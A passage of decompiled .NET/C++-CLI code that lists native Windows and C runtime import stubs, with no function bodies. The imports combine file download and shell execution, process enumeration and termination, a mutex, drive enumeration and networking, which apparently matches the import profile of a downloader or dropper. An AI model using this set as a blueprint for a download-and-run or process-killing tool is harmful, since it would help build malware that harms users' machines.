  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int gethostname([In] sbyte* obj0, [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* getenv([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* CreateToolhelp32Snapshot([In] uint obj0, [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int FindNextFileW([In] void* obj0, [In] _WIN32_FIND_DATAW* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* CreateMutexA([In] _SECURITY_ATTRIBUTES* obj0, [In] int obj1, [In] sbyte* obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* inet_ntoa([In] in_addr obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int Process32NextW([In] void* obj0, [In] tagPROCESSENTRY32W* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void SysFreeString([In] char* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int WSAStartup([In] ushort obj0, [In] WSAData* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int URLDownloadToFileW(
    [In] IUnknown* obj0,
    [In] char* obj1,
    [In] char* obj2,
    [In] uint obj3,
    [In] IBindStatusCallback* obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void _CxxThrowException([In] void* obj0, [In] _s__ThrowInfo* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe HINSTANCE__* ShellExecuteW(
    [In] HWND__* obj0,
    [In] char* obj1,
    [In] char* obj2,
    [In] char* obj3,
    [In] char* obj4,
    [In] int obj5);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int sprintf([In] sbyte* obj0, [In] sbyte* obj1, __arglist);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int Process32FirstW([In] void* obj0, [In] tagPROCESSENTRY32W* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int FindClose([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern void _com_issue_error([In] int obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int wcstombs_s(
    [In] uint* obj0,
    [In] sbyte* obj1,
    [In] uint obj2,
    [In] char* obj3,
    [In] uint obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void __CxxUnregisterExceptionObject([In] void* obj0, [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int isdigit([In] int obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern uint GetLastError();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void srand([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int rand();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int __CxxExceptionFilter(
    [In] void* obj0,
    [In] void* obj1,
    [In] int obj2,
    [In] void* obj3);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int MultiByteToWideChar(
    [In] uint obj0,
    [In] uint obj1,
    [In] sbyte* obj2,
    [In] int obj3,
    [In] char* obj4,
    [In] int obj5);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint GetModuleFileNameW([In] HINSTANCE__* obj0, [In] char* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int TerminateProcess([In] void* obj0, [In] uint obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void _invalid_parameter_noinfo();

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* _com_util\u002EConvertBSTRToString([In] char* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint GetFileAttributesA([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int remove([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* OpenProcess([In] uint obj0, [In] int obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int atoi([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* GetProcessHeap();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int __CxxRegisterExceptionObject([In] void* obj0, [In] void* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe HINSTANCE__* ShellExecuteA(
    [In] HWND__* obj0,
    [In] sbyte* obj1,
    [In] sbyte* obj2,
    [In] sbyte* obj3,
    [In] sbyte* obj4,
    [In] int obj5);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe hostent* gethostbyname([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int CreateDirectoryW([In] char* obj0, [In] _SECURITY_ATTRIBUTES* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int HeapFree([In] void* obj0, [In] uint obj1, [In] void* obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern int isspace([In] int obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int InterlockedDecrement([In] int* obj0);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* new\u005B\u005D([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint GetDriveTypeW([In] char* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int URLDownloadToFileA(
    [In] IUnknown* obj0,
    [In] sbyte* obj1,
    [In] sbyte* obj2,
    [In] uint obj3,
    [In] IBindStatusCallback* obj4);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* FindFirstFileW([In] char* obj0, [In] _WIN32_FIND_DATAW* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern bool std\u002Euncaught_exception();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Eoperator\u002B\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1,
    [In] sbyte* obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Eoperator\u002B\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj1,
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe exception* std\u002Eexception\u002E\u007Bctor\u007D(
    [In] exception* obj0,
    [In] sbyte** obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe exception* std\u002Eexception\u002E\u007Bctor\u007D(
    [In] exception* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* std\u002Eexception\u002Ewhat([In] exception* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Eoperator\u003C\u003C\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern unsafe bool std\u002Eoperator\u0021\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern unsafe bool std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern unsafe bool std\u002Eoperator\u003D\u003D\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint mbstowcs([In] char* obj0, [In] sbyte* obj1, [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int memmove_s([In] void* obj0, [In] uint obj1, [In] void* obj2, [In] uint obj3);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe char* SysAllocString([In] char* obj0);
}
